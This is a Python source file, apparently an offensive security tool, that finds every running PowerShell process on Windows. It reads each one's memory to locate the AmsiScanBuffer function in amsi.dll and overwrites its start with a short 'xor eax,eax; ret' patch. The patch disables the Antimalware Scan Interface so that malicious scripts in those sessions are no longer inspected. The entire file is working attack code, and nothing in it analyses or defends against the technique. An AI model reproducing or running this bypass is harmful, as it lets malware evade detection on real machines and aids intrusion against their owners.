import psutil
import sys
from ctypes import *


KERNEL32 = windll.kernel32
PROCESS_ACCESS = (
    0x000F0000 |        # STANDARD_RIGHTS_REQUIRED
    0x00100000 |        # SYNCHRONIZE
    0xFFFF
)
PAGE_READWRITE = 0x40


def getPowershellPids():
    ppids = [pid for pid in psutil.pids() if psutil.Process(pid).name() == 'powershell.exe']
    return ppids


def readBuffer(handle, baseAddress, AmsiScanBuffer):
    KERNEL32.ReadProcessMemory.argtypes = [c_ulong, c_void_p, c_void_p, c_ulong, c_int]
    while True:
        lpBuffer = create_string_buffer(b'', len(AmsiScanBuffer))
        nBytes = c_int(0)
        KERNEL32.ReadProcessMemory(handle, baseAddress, lpBuffer, len(lpBuffer), nBytes)
        if lpBuffer.value == AmsiScanBuffer or lpBuffer.value.startswith(b'\x29\xc0\xc3'):
            return baseAddress
        else:
            baseAddress += 1


def writeBuffer(handle, address, buffer):
    nBytes = c_int(0)
    KERNEL32.WriteProcessMemory.argtypes = [c_ulong, c_void_p, c_void_p, c_ulong, c_void_p]
    res = KERNEL32.WriteProcessMemory(handle, address, buffer, len(buffer), byref(nBytes))
    if not res:
        print(f'[-] WriteProcessMemory Error: {KERNEL32.GetLastError()}')
    return res


def getAmsiScanBufferAddress(handle, baseAddress):
    AmsiScanBuffer = (
        b'\x4c\x8b\xdc' +       # mov r11,rsp
        b'\x49\x89\x5b\x08' +   # mov qword ptr [r11+8],rbx
        b'\x49\x89\x6b\x10' +   # mov qword ptr [r11+10h],rbp
        b'\x49\x89\x73\x18' +   # mov qword ptr [r11+18h],rsi
        b'\x57' +               # push rdi
        b'\x41\x56' +           # push r14
        b'\x41\x57' +           # push r15
        b'\x48\x83\xec\x70'     # sub rsp,70h
    )
    return readBuffer(handle, baseAddress, AmsiScanBuffer)


def patchAmsiScanBuffer(handle, funcAddress):
    patchPayload = (
        b'\x29\xc0' +           # xor eax,eax
        b'\xc3'                 # ret
    )
    return writeBuffer(handle, funcAddress, patchPayload)


def getAmsiDllBaseAddress(handle, pid):
    MAX_PATH = 260
    MAX_MODULE_NAME32 = 255
    TH32CS_SNAPMODULE = 0x00000008
    class MODULEENTRY32(Structure):
        _fields_ = [ ('dwSize', c_ulong) ,
                    ('th32ModuleID', c_ulong),
                    ('th32ProcessID', c_ulong),
                    ('GlblcntUsage', c_ulong),
                    ('ProccntUsage', c_ulong) ,
                    ('modBaseAddr', c_size_t) ,
                    ('modBaseSize', c_ulong) ,
                    ('hModule', c_void_p) ,
                    ('szModule', c_char * (MAX_MODULE_NAME32+1)),
                    ('szExePath', c_char * MAX_PATH)]

    me32 = MODULEENTRY32()
    me32.dwSize = sizeof(MODULEENTRY32)
    snapshotHandle = KERNEL32.CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid)
    ret = KERNEL32.Module32First(snapshotHandle, pointer(me32))
    while ret:
        if me32.szModule == b'amsi.dll':
            print(f'[+] Found base address of {me32.szModule.decode()}: {hex(me32.modBaseAddr)}')
            KERNEL32.CloseHandle(snapshotHandle)
            return getAmsiScanBufferAddress(handle, me32.modBaseAddr)
        else:
            ret = KERNEL32.Module32Next(snapshotHandle , pointer(me32))


for pid in getPowershellPids():
    process_handle = KERNEL32.OpenProcess(PROCESS_ACCESS, False, pid)
    if not process_handle:
        continue
    print(f'[+] Got process handle of powershell at {pid}: {hex(process_handle)}')
    print(f'[+] Trying to find AmsiScanBuffer in {pid} process memory...')
    amsiDllBaseAddress = getAmsiDllBaseAddress(process_handle, pid)
    if not amsiDllBaseAddress:
        print(f'[-] Error finding amsiDllBaseAddress in {pid}.')
        print(f'[-] Error: {KERNEL32.GetLastError()}')
        sys.exit(1)
    else:
        print(f'[+] Trying to patch AmsiScanBuffer found at {hex(amsiDllBaseAddress)}')
        if not patchAmsiScanBuffer(process_handle, amsiDllBaseAddress):
            print(f'[-] Error patching AmsiScanBuffer in {pid}.')
            print(f'[-] Error: {KERNEL32.GetLastError()}')
            sys.exit(1)
        else:
            print(f'[+] Success patching AmsiScanBuffer in PID {pid}')
    KERNEL32.CloseHandle(process_handle)
    print('')